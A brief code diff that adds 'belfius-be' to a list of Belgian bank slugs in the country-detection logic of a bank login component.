@@ -797,7 +797,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
     normalizedCountry === "belcika" ||
     normalizedCountry === "be" ||
     hasBelgiumSuffix ||
-    ["argenta-be", "bnp-paribas-fortis-be", "beobank-be", "ing-be", "kbc-be"].includes(normalizedSlug)
+    ["argenta-be", "bnp-paribas-fortis-be", "beobank-be", "ing-be", "kbc-be", "belfius-be"].includes(normalizedSlug)
   );
 
   if (isBelgium) {
